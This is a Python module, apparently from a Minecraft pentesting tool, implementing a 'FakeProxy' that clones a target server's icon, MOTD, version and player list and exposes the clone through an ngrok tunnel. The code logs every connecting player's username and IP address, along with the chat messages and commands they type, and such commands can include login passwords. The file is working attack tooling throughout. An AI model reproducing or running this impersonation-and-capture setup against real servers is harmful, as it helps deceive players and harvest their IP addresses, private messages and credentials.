import os
import time
import base64
import shutil
import subprocess
import datetime

from src.decoration.paint import paint
from src.decoration.mini_messages_format import minimessage_colors
from src.decoration.mccolor.mc_remove import mcremove
from src.minecraft.get_minecraft_server_data import GetMinecraftServerData
from src.managers.json_manager import JsonManager
from src.utilities.file_utilities import FileUtilities
from src.utilities.check_utilities import CheckUtilities
from src.utilities.get_utilities import GetUtilities
from src.managers.log_manager import LogManager


class FakeProxy:
    @staticmethod
    def setup(address):
        """
        Set up the Fakeproxy based on the provided Minecraft server address.

        Args:
            address (str): Target server address.

        Returns:
            bool: True if the setup is successful, False if any errors occur.
        """

        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "copyingData"])}')
        
        # Retrieve Minecraft server data for the specified address.
        server_data = GetMinecraftServerData.get_data(address, bot=False, clean_data=False)

        if server_data is None:
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "errorWhenCopying"])}')
            return False
                    
        if server_data['platform_type'] != 'Java':
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "errorBedrockServer"])}')
            return False
        
        # Copy server icon or use the default one.
        if server_data['favicon'] is not None:
            with open(f'./mcptool_files/proxy/jar/fakeproxy/server-icon.png', 'wb') as f:
                f.truncate(0)
                icon = str(server_data['favicon']).replace('data:image/png;base64,', '')
                icon = base64.b64decode(icon)
                f.write(icon)
        else:
            shutil.copy('./mcptool_files/proxy/server-icon.png', f'./mcptool_files/proxy/jar/fakeproxy/server-icon.png')

        # Write the command prefix to the Fakeproxy config.
        FileUtilities.write_file(f'./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/config/commandPrefix', JsonManager.get(['proxyConfig', 'fakeProxyCommandPrefix']), 'w+', True)

        # Start ngrok tunnel if available.
        if CheckUtilities.check_ngrok():
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "ngrokStart"])}')
            subprocess.Popen(f'{JsonManager.get(["proxyConfig", "ngrokCommand"])} tcp {JsonManager.get(["proxyConfig", "fakeProxyPort"])} >nul 2>&1', stdout=subprocess.PIPE, shell=True)
        
        else:
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "ngrokNotFound"])}')

        # Clear the existing data file for Fakeproxy.
        if os.path.exists('./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/data.txt'):
            FileUtilities.write_file(f'./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/config/commandPrefix', '', 'w+', True)

        return True

    @staticmethod
    def show_data(address, log_file):
        """
        Updates the on-screen data about Fakeproxy.

        Args:
            address (str): Target
            log_file (str): Log File
        """

        fakeproxy_data_file = './mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/data.txt'
        data_file_lines = 0

        # Display a message indicating that the command is waiting for data.
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "waitingForData"])}\n')

        while True:
            # Sleep for 1 second to control the update frequency.
            time.sleep(1)
            FakeProxy.update_data(address)

            if os.path.exists(fakeproxy_data_file):
                data_file_content = FileUtilities.read_file(fakeproxy_data_file, 'readlines')

                while True:
                    try:
                        line = data_file_content[data_file_lines]
                        line = line.replace('\n', '')
                        player_data = line.split('/#-#/')
                        username = player_data[1]
                        ip_address = player_data[2]
                        username_data = f'&c&l{username} &f&l(&c&l{ip_address}&f&l)'
                        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                        if player_data[0] == '[CONNECTING]':
                            # Display a message for a player connecting.
                            paint(f'{GetUtilities.get_spaces()}🟢 &f{current_time} {GetUtilities.get_translated_text(["commands", "fakeproxy", "connecting"]).replace("[0]", username_data)}')
                            log_data = f'\n{current_time} 🟢 {username_data}'

                        if player_data[0] == '[DISCONNECTING]':
                            # Display a message for a player disconnecting.
                            paint(f'{GetUtilities.get_spaces()}🔴 &f{current_time} {GetUtilities.get_translated_text(["commands", "fakeproxy", "disconnecting"]).replace("[0]", username_data)}')
                            log_data = f'\n{current_time} 🔴 {username_data}'

                        if player_data[0] == '[CHAT]':
                            message = player_data[3]
                            # Display a message for a chat message captured.
                            paint(f'{GetUtilities.get_spaces()}✉️ &f{current_time} {GetUtilities.get_translated_text(["commands", "fakeproxy", "messageCaptured"]).replace("[0]", username_data)} &a{message}')
                            log_data = f'\n{current_time} ✉️ {username_data} => {message}'

                        if player_data[0] == '[COMMAND]':
                            command = player_data[3]
                            # Display a message for a command captured.
                            paint(f'{GetUtilities.get_spaces()}💣 &f{current_time} {GetUtilities.get_translated_text(["commands", "fakeproxy", "commandCaptured"]).replace("[0]", username_data)} &a{command}')
                            log_data = f'\n{current_time} 💣 {username_data} => {command}'

                        if JsonManager.get('logs'):
                            # If logging is enabled, write the log data to the specified log file.
                            LogManager.write_log(log_file, 'fakeproxy', mcremove(log_data))

                        data_file_lines += 1

                    except IndexError:
                        break
    
    @staticmethod
    def update_data(address):
        """
        Updates the data of the proxy used for the Fakeproxy in real time.

        Args:
            address (str): Target
        """

        # Retrieve Minecraft server data for the specified address.
        server_data = GetMinecraftServerData.get_data(address, bot=False, clean_data=False)

        if server_data is None or server_data['platform_type'] != 'Java':
            return
        
        # Update settings and data files used by the Fakeproxy.
        FileUtilities.write_file('./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/settings/onlinePlayers', str(server_data['connected_players']), 'w+', True)
        FileUtilities.write_file('./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/settings/maximumPlayers', str(server_data['max_player_limit']), 'w+', True)
        FileUtilities.write_file('./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/settings/protocol', str(server_data['protocol']), 'w+', True)
        FileUtilities.write_file('./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/settings/version', str(minimessage_colors(server_data['version'])), 'w+', True)
        FileUtilities.write_file('./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/settings/motd', str(minimessage_colors(server_data['motd'])), 'w+', True)
        FileUtilities.write_file('./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/settings/samplePlayers', '', 'w+', True)

        if server_data['default_player_list'] is not None:
            for player in server_data['default_player_list']:
                if type(player) == dict:
                    username = player['name']
                    uuid = player.get('uuid', player.get('id', None))
                    FileUtilities.write_file('./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/settings/samplePlayers', f'{username}/#-#/{uuid}\n', 'a', False)

                else:
                    FileUtilities.write_file('./mcptool_files/proxy/jar/fakeproxy/plugins/RPoisoner/settings/samplePlayers', f'{player}/#-#/00000000-0000-0000-0000-000000000000\n', 'a', False)
